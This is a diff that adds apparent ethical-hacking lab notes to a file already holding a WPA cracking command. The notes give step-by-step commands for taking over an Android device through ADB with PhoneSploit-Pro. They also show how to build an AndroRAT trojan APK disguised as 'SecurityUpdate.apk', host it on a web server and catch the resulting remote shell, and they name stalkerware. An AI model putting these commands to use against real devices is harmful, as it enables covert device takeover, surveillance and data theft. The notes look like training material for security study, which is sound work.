@@ -115,3 +115,40 @@ run aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/passwor
 -w stands for wordlist; provide the path to a wordlist.
 
 
+
+
+Exploit the Android Platform through ADB using PhoneSploit-Pro
+
+sudo su
+cd PhoneSploit-Pro 
+python3 phonesploitpro.py 
+Type 1 and press Enter to select 1. Connect a Device option.
+type the target Android device's IP address
+go to next option type n 
+In the shell command line, type pwd and press Enter to view the present working directory on the target Android device.
+ls to view file present 
+cd sdcard - move to  cd directory
+27 to get device information 
+
+AndroRAT is a tool designed to give control of an Android system to a remote user and to retrieve information from it.
+Parrot
+cd AndroRAT
+Run python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk command to create an APK file (here, SecurityUpdate.apk).
+	• --build: is used for building the APK
+	• -i: specifies the local IP address (here, 10.10.1.13)
+	• -p: specifies the port number (here, 4444)
+	• -o: specifies the output APK file (here, SecurityUpdate.apk)	
+You can observe that an APK file (SecurityUpdate.apk) is generated at the location /home/attacker/AndroRAT/
+Run cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/ command to copy the SecurityUpdate.apk file to the location share folder.
+	• Run mkdir /var/www/html/share command to create a shared folder
+	• Run chmod -R 755 /var/www/html/share command
+	• Run chown -R www-data:www-data /var/www/html/share command
+Execute service apache2 start command to start an Apache web server.
+run python3 androRAT.py --shell -i 0.0.0.0 -p 4444 command to start listening to the victim's machine.
+	• --shell: is used for getting the interpreter
+	• -i: specifies the IP address for listening (here, 0.0.0.0)
+	• -p: specifies the port number (here, 4444)
+ Interpreter session, type help 
+ You can also use other Android hacking tools such as hxp_photo_eye (https://github.com), Gallery Eye (https://github.com), mSpy (https://www.mspy.com), and Hackingtoolkit (https://github.com) to hack Android devices.
+
+
